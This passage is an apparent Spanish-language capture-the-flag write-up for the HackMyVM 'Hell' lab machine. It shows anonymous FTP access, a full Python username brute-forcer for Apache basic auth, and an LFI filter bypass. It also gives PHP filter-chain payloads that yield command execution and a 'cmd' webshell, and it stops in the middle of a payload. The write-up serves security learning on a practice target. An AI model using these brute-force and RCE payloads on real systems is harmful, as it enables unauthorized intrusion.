@@ -1,0 +1,1623 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackMyVM Hell</title>
+
+  <meta name="description" content="Resolución de la máquina Hell de la plataforma de HackMyVM">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackMyVM Hell">
+  <meta name="twitter:description" content="Resolución de la máquina Hell de la plataforma de HackMyVM">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/logo.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackMyVM Hell">
+  <meta property="og:description" content="Resolución de la máquina Hell de la plataforma de HackMyVM">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/logo.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/logo.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackMyVM Hell" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/hmv" title="GatoGamer1155" class="blog-button">HackMyVM</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#preparation">Preparación</a></li>
+        <li><a href="#flag1">Flag 1</a></li>
+        <li><a href="#flag2">Flag 2</a></li>
+        <li><a href="#flag3">Flag 3</a></li>
+        <li><a href="#flag4">Flag 4</a></li>
+        <li><a href="#flag5">Flag 5</a></li>
+        <li><a href="#flag6">Flag 6</a></li>
+        <li><a href="#flag7">Flag 7</a></li>
+        <li><a href="#flag8">Flag 8</a></li>
+        <li><a href="#flag9">Flag 9</a></li>
+        <li><a href="#flag10">Flag 10</a></li>
+        <li><a href="#flag11">Flag 11</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackMyVM</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/logo.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Hell</h2><br>
+  </header>
+  
+<section class="post" id="preparation">
+<br><h3 class="post-title">Preparación</h3><br>
+
+<p class="plain-text">Iniciemos por la descarga, dependiendo la plataforma que uses para la máquina virtual es mejor descargarlo en un link u otro ya que varia alguna configuracion</p>
+
+<li class="plain-text"><a href="https://drive.google.com/file/d/1oYBuJ3T6wYS8pUR7anHY5mM0ZU7laiuA/view">VMWare</a></li><br>
+<li class="plain-text"><a href="https://downloads.hackmyvm.eu/hell.zip">Virtual Box</a></li><br>
+
+<p class="plain-text">Al descomprimir el zip nos queda el ova además de un <code class="language-plaintext highlighter-rouge">readme.txt</code> el cual contiene un par de instrucciones para correr los servicios antes de iniciar a vulnerar la máquina</p>
+<a href="/hmv/hell/1.png" target="_blank"><div><p><img src="/hmv/hell/1.png"></p></div></a>
+
+<p class="plain-text">Iniciamos la maquina y como dicen las instrucciones iniciacmos sesión con las credenciales <code class="language-plaintext highlighter-rouge">run:run</code> despues de ello ejecutamos <code class="language-plaintext highlighter-rouge">sudo run</code> para correr los servicios, al mostrarse el mensaje <code class="language-plaintext highlighter-rouge">Happy Hacking ;)</code> todo deberia estar corriendo</p>
+<a href="/hmv/hell/2.png" target="_blank"><div><p><img src="/hmv/hell/2.png"></p></div></a>
+</section>
+
+<section class="post" id="flag1">
+<br><h3 class="post-title">Flag 1</h3>
+<h4 class="post-title">HELL{4N0NYM0U5_15_7H3_B357_U53R}</h4><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos 3 puertos abiertos, donde corren los servicios <code class="language-plaintext highlighter-rouge">ftp</code>, <code class="language-plaintext highlighter-rouge">ssh</code> y <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">192.168.100.91
+Nmap scan report for 192.168.100.91
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos probar conectarnos a <code class="language-plaintext highlighter-rouge">ftp</code> como el usuario <code class="language-plaintext highlighter-rouge">anonymous</code> sin proporcionar ninguna contraseña, al hacerlo parece que acepta la autenticacion por defecto</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ftp </span><span class="p">192.168.100.91
+Connected to 192.168.100.91.
+220 (vsFTPd 3.0.5)
+Name (192.168.100.91:kali): anonymous  
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al listar los archivos con <code class="language-plaintext highlighter-rouge">ls</code> nos encontramos con un archivo <code class="language-plaintext highlighter-rouge">flag.txt</code>, podemos simplemente descargarlo con <code class="language-plaintext highlighter-rouge">get</code>, salir y leerlo este txt contiene la primera <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ftp> ls
+229 Entering Extended Passive Mode (|||11761|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             256 Feb 16 09:44 flag.txt
+226 Directory send OK.
+ftp> get flag.txt
+local: flag.txt remote: flag.txt
+229 Entering Extended Passive Mode (|||57396|)
+150 Opening BINARY mode data connection for flag.txt (256 bytes).  
+226 Transfer complete.
+256 bytes received in 00:00 (85.96 KiB/s)
+ftp> exit
+221 Goodbye.
+
+</span><span class="ve">❯ cat </span><span class="p">flag.txt
+
+▄▀█ █▄ █ █▀█ █▄ █ █▄█ █▀▄▀█ █▀█ █ █ █▀
+█▀█ █ ▀█ █▄█ █ ▀█  █  █ ▀ █ █▄█ █▄█ ▄█
+
+Flag 1: HELL{4N0NYM0U5_15_7H3_B357_U53R}</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag2">
+<br><h3 class="post-title">Flag 2</h3>
+<h4 class="post-title">HELL{BRUT3_F0RC3_M4Y_B3_4N_0P710N}</h4><br>
+
+<p class="plain-text">Ademas de la flag, no nos aporta realmente nada asi que vayamos a la <code class="language-plaintext highlighter-rouge">web</code>, esta pide unas credenciales utilizando como metodo de autenticación el basico de <code class="language-plaintext highlighter-rouge">apache</code></p>
+<a href="/hmv/hell/3.png" target="_blank"><div><p><img src="/hmv/hell/3.png"></p></div></a>
+
+<p class="plain-text">Volviendo a <code class="language-plaintext highlighter-rouge">ftp</code> si agregamos el parametro <code class="language-plaintext highlighter-rouge">-la</code> para ver archivos ocultos vemos un archivo <code class="language-plaintext highlighter-rouge">.passwd</code>, lo descargamos con <code class="language-plaintext highlighter-rouge">get</code> y al leerlo nos muestra una contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ftp> ls -la
+229 Entering Extended Passive Mode (|||48280|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        115          4096 Feb 16 09:44 .
+drwxr-xr-x    2 0        115          4096 Feb 16 09:44 ..
+-rw-r--r--    1 0        0              34 Feb 16 06:57 .passwd
+-rw-r--r--    1 0        0             256 Feb 16 09:44 flag.txt  
+226 Directory send OK.
+ftp> get .passwd
+local: .passwd remote: .passwd
+229 Entering Extended Passive Mode (|||37079|)
+150 Opening BINARY mode data connection for .passwd (34 bytes).
+226 Transfer complete.
+34 bytes received in 00:00 (12.21 KiB/s)
+ftp> exit
+221 Goodbye.
+
+</span><span class="ve">❯ cat </span><span class="p">.passwd
+
+The password is: webserver2023!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tenemos una contraseña pero no un usuario, probamos con el usuario <code class="language-plaintext highlighter-rouge">admin</code> pero devuelve un codigo de estado <code class="language-plaintext highlighter-rouge">401</code> Unauthorized asi que la credencial no es valida</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">http://192.168.100.91 -u admin:webserver2023! -I  
+HTTP/1.1 401 Unauthorized
+Date: Thu, 15 Jun 2023 22:11:30 GMT
+Server: Apache/2.4.52 (Ubuntu)
+WWW-Authenticate: Basic realm="Restricted Content"
+Content-Type: text/html; charset=iso-8859-1</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciemos con un script en <code class="language-plaintext highlighter-rouge">python</code>, importamos algunas librerias y definimos el target que es la <code class="language-plaintext highlighter-rouge">url</code> de la web, despues una barra de progreso y un <code class="language-plaintext highlighter-rouge">contador</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
+</span><span class="o">import </span><span class="p">requests, sys
+
+target </span><span class="o">= </span><span class="s">"http://192.168.100.91/"  
+</span><span class="p">
+bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="s">""</span><span class="p">)
+counter </span><span class="o">= </span><span class="mi">1</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora usaremos un diccionario de nombres de <a href="https://github.com/danielmiessler/SecLists">seclists</a>, iterando por cada linea de este probaremos una <code class="language-plaintext highlighter-rouge">autenticacion</code> con ese usuario y la contraseña que tenemos de antes, ademas de actualizar el contador y mostrar el <code class="language-plaintext highlighter-rouge">usuario</code> en la barra</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">with </span><span class="no">open</span><span class="p">(</span><span class="s">"/usr/share/seclists/Usernames/Names/names.txt"</span><span class="p">) </span><span class="o">as </span><span class="p">file:
+    </span><span class="o">for </span><span class="p">line </span><span class="o">in </span><span class="p">file:
+        user </span><span class="o">= </span><span class="p">line.strip()
+        bar.status(</span><span class="no">f</span><span class="s">"Probando usuario [</span><span class="p">{counter}</span><span class="s">/10177]: </span><span class="p">{user}</span><span class="s">"</span><span class="p">)
+        request </span><span class="o">= </span><span class="p">requests.get(target, </span><span class="am">auth</span><span class="o">=</span><span class="p">(user, </span><span class="s">"webserver2023!"</span><span class="p">))  
+        counter </span><span class="o">+= </span><span class="mi">1</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora esperamos a que el <code class="language-plaintext highlighter-rouge">codigo</code> de estado de la peticion sea diferente a <code class="language-plaintext highlighter-rouge">401</code>, si es asi mostramos el <code class="language-plaintext highlighter-rouge">usuario</code> por consola y simplemente terminamos el programa</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">if </span><span class="p">request.status_code </span><span class="o">!= </span><span class="mi">401</span><span class="p">:
+    bar.success(</span><span class="no">f</span><span class="s">"El usuario </span><span class="p">{user} </span><span class="s">es válido"</span><span class="p">)
+    sys.exit(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El script final seria el siguiente y al ejecutarlo este empezara a <code class="language-plaintext highlighter-rouge">bruteforcear</code> los usuarios del diccionario hasta encontrar una autenticacion valida con la contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
+</span><span class="o">import </span><span class="p">requests, sys
+
+target </span><span class="o">= </span><span class="s">"http://192.168.100.91/"
+</span><span class="p">
+bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="s">""</span><span class="p">)
+counter </span><span class="o">= </span><span class="mi">1
+
+</span><span class="o">with </span><span class="no">open</span><span class="p">(</span><span class="s">"/usr/share/seclists/Usernames/Names/names.txt"</span><span class="p">) </span><span class="o">as </span><span class="p">file:
+    </span><span class="o">for </span><span class="p">line </span><span class="o">in </span><span class="p">file:
+        user </span><span class="o">= </span><span class="p">line.strip()
+        bar.status(</span><span class="no">f</span><span class="s">"Probando usuario [</span><span class="p">{counter}</span><span class="s">/10177]: </span><span class="p">{user}</span><span class="s">"</span><span class="p">)
+        request </span><span class="o">= </span><span class="p">requests.get(target, </span><span class="am">auth</span><span class="o">=</span><span class="p">(user, </span><span class="s">"webserver2023!"</span><span class="p">))  
+        counter </span><span class="o">+= </span><span class="mi">1
+
+        </span><span class="o">if </span><span class="p">request.status_code </span><span class="o">!= </span><span class="mi">401</span><span class="p">:
+            bar.success(</span><span class="no">f</span><span class="s">"El usuario </span><span class="p">{user} </span><span class="s">es válido"</span><span class="p">)
+            sys.exit(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="az">-</span><span class="p">] Probando usuario [209/10177]: alberto  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de un par de segundos conseguimos una autenticacion válida con <code class="language-plaintext highlighter-rouge">beilul</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] El usuario beilul es válido  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente ir a la web y en el <code class="language-plaintext highlighter-rouge">login</code> de apache autenticarnos como el usuario <code class="language-plaintext highlighter-rouge">beilul</code> y como contraseña la que hemos conseguido antes en ftp</p>
+<a href="/hmv/hell/4.png" target="_blank"><div><p><img src="/hmv/hell/4.png"></p></div></a>
+
+<p class="plain-text">Al hacerlo obtenemos acceso a la pagina, donde encontramos la segunda <code class="language-plaintext highlighter-rouge">flag</code></p>
+<a href="/hmv/hell/5.png" target="_blank"><div><p><img src="/hmv/hell/5.png"></p></div></a>
+
+</section>
+
+<section class="post" id="flag3">
+<br><h3 class="post-title">Flag 3</h3>
+<h4 class="post-title">HELL{LF1_F1LT7R_CH41N_G3N3R4T0R}</h4><br>
+
+<p class="plain-text">Tenemos un menú donde podemos seleccionar varios <code class="language-plaintext highlighter-rouge">perfiles</code>, cada uno de ellos carga un <code class="language-plaintext highlighter-rouge">html</code> diferente, este lo gestiona mediante el parametro <code class="language-plaintext highlighter-rouge">profile</code> por GET</p>
+<a href="/hmv/hell/6.png" target="_blank"><div><p><img src="/hmv/hell/6.png"></p></div></a>
+
+<p class="plain-text">Podemos probar un LFI y cargar el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> en el parametro <code class="language-plaintext highlighter-rouge">profile</code>, sin embargo al hacerlo nos bloquea y devuelve el mensaje <code class="language-plaintext highlighter-rouge">Attack detected</code></p>
+<a href="/hmv/hell/7.png" target="_blank"><div><p><img src="/hmv/hell/7.png"></p></div></a>
+
+<p class="plain-text">Sin embargo no está bien sanitizado, ya que con solo usar un <code class="language-plaintext highlighter-rouge">wrapper</code> como lo es <code class="language-plaintext highlighter-rouge">file://</code> podemos cargar el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> o cualquier archivo que queramos</p>
+<a href="/hmv/hell/8.png" target="_blank"><div><p><img src="/hmv/hell/8.png"></p></div></a>
+
+<p class="plain-text">Una vulnerabilidad relativamente nueva para conseguir <code class="language-plaintext highlighter-rouge">RCE</code> a través de un LFI es el <a href="git clone https://github.com/synacktiv/php_filter_chain_generator">Filter Chain</a>, podemos crear un payload en <code class="language-plaintext highlighter-rouge">php</code> que nos ejecute el comando <code class="language-plaintext highlighter-rouge">id</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">php_filter_chain_generator.py --chain </span><span class="am">'&lt?php system("id"); ?>'</span><span class="p">
+[+] The following gadget chain will generate the following code : &lt?php system("id"); ?> (base64 value: PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al pasarle todo el <code class="language-plaintext highlighter-rouge">payload</code> creado en el LFI del parametro <code class="language-plaintext highlighter-rouge">profile</code> podemos ver reflejado el output del comando <code class="language-plaintext highlighter-rouge">id</code> que fue ejecutado por el usuario <code class="language-plaintext highlighter-rouge">www-data</code></p>
+<a href="/hmv/hell/9.png" target="_blank"><div><p><img src="/hmv/hell/9.png"></p></div></a>
+
+<p class="plain-text">Para mas comodidad crearemos un payload en <code class="language-plaintext highlighter-rouge">php</code> que ejecute con <code class="language-plaintext highlighter-rouge">system</code> un comando que controlaremos mediante el parametro <code class="language-plaintext highlighter-rouge">cmd</code> mediante el metodo <code class="language-plaintext highlighter-rouge">GET</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">php_filter_chain_generator.py --chain </span><span class="am">'&lt?php system($_GET["cmd"]); ?>'</span><span class="p">
+[+] The following gadget chain will generate the following code : &lt?php system($_GET["cmd"]); ?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|c